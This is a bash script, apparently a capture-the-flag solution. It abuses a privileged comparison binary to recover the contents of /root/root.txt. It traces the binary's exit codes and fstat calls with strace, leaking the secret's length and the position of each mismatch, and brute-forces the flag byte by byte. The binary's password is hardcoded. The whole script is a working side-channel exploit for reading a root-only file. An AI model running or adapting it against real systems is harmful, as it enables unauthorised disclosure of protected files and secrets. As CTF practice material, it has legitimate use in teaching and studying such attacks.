#!/usr/bin/env bash
set -euo pipefail

BIN="${BIN:-/usr/bin/ffidYm}"
TARGET="${TARGET:-/root/root.txt}"
PW="${PW:-YaSjelVsyuSm3tanu:(}"
GUESS="${GUESS:-/tmp/guess.bin}"
LEN="${LEN:-0}"
PREFIX="${PREFIX:-CTF{"

usage() {
  printf 'usage: %s [-b bin] [-t target] [-p password] [-g guess] [-l len] [-P prefix] [-F]\n' "$0"
  exit 1
}

FULL=0
while getopts "b:t:p:g:l:P:F" opt; do
  case "$opt" in
    b) BIN="$OPTARG" ;;
    t) TARGET="$OPTARG" ;;
    p) PW="$OPTARG" ;;
    g) GUESS="$OPTARG" ;;
    l) LEN="$OPTARG" ;;
    P) PREFIX="$OPTARG" ;;
    F) FULL=1 ;;
    *) usage ;;
  esac
done

write_guess() {
  local hex="$1"
  local total="$2"
  python3 - "$GUESS" "$hex" "$total" <<'PY'
import binascii, sys
path = sys.argv[1]
hexstr = sys.argv[2]
total = int(sys.argv[3])
data = binascii.unhexlify(hexstr) if hexstr else b""
with open(path, "wb") as f:
    f.write(data)
    if len(data) < total:
        f.write(b"\x00" * (total - len(data)))
PY
}

exit_index() {
  local trace="/tmp/trace.$$"
  printf '%s\n' "$PW" | strace -qq -e trace=exit_group -o "$trace" \
    "$BIN" --quiet "$TARGET" "$GUESS" >/dev/null 2>&1 || true

  local idx
  if [ -f "$trace" ]; then
    idx="$(awk -F'[()]' '/exit_group/{print $(NF-1)}' "$trace" | tail -n1)"
  else
    idx=""
  fi
  if [ -z "$idx" ]; then
    printf '%s\n' "$PW" | "$BIN" --quiet "$TARGET" "$GUESS" >/dev/null 2>&1 || true
    idx="$?"
  fi
  printf '%s\n' "$idx"
}

detect_len() {
  local trace="/tmp/trace.size.$$"
  : > "$GUESS"
  printf '%s\n' "$PW" | strace -qq -e trace=fstat -o "$trace" \
    "$BIN" --quiet "$TARGET" "$GUESS" >/dev/null 2>&1 || true

  if [ ! -f "$trace" ]; then
    return 1
  fi

  awk '
    {
      if (match($0, /st_size=([0-9]+)/, m)) {
        if (m[1] + 0 > max) max = m[1] + 0
      }
    }
    END { if (max > 0) print max }
  ' "$trace"
}

hex_prefix="$(python3 - "$PREFIX" <<'PY'
import sys, binascii
sys.stdout.write(binascii.hexlify(sys.argv[1].encode()).decode())
PY
)"
known_hex="$hex_prefix"
known_len="${#PREFIX}"

if [ "$LEN" -le 0 ]; then
  LEN="$(detect_len || true)"
  if [ -z "$LEN" ]; then
    printf 'не удалось определить длину, задай -l\n' >&2
    exit 1
  fi
fi

if [ "$LEN" -lt "$known_len" ]; then
  printf 'len меньше префикса\n' >&2
  exit 1
fi

print_status() {
  local i="$1"
  local cur
  cur="$(python3 - "$known_hex" <<'PY'
import sys, binascii
sys.stdout.write(binascii.unhexlify(sys.argv[1]).decode(errors="replace"))
PY
)"
  printf '\r[%d/%d] %s' "$((i + 1))" "$LEN" "$cur" >&2
}

for ((i = known_len; i < LEN; i++)); do
  found=0

  if [ "$FULL" -eq 0 ]; then
    for b in $(seq 32 126); do
      hex="$(printf '%02x' "$b")"
      write_guess "${known_hex}${hex}" "$LEN"
      idx="$(exit_index)"

      if [ "$idx" -gt "$i" ] 2>/dev/null || { [ "$idx" -eq -1 ] && [ "$i" -eq $((LEN - 1)) ]; }; then
        known_hex+="$hex"
        found=1
        print_status "$i"
        break
      fi
    done
  fi

  if [ "$found" -eq 0 ]; then
    for b in $(seq 0 255); do
      hex="$(printf '%02x' "$b")"
      write_guess "${known_hex}${hex}" "$LEN"
      idx="$(exit_index)"
      if [ "$idx" -gt "$i" ] 2>/dev/null || { [ "$idx" -eq -1 ] && [ "$i" -eq $((LEN - 1)) ]; }; then
        known_hex+="$hex"
        found=1
        print_status "$i"
        break
      fi
    done
  fi

  if [ "$found" -eq 0 ]; then
    printf '\nошибка на позиции %d\n' "$i" >&2
    exit 2
  fi
done

printf '\n%s\n' "$(python3 - "$known_hex" <<'PY'
import sys, binascii
sys.stdout.write(binascii.unhexlify(sys.argv[1]).decode(errors="replace"))
PY
)"
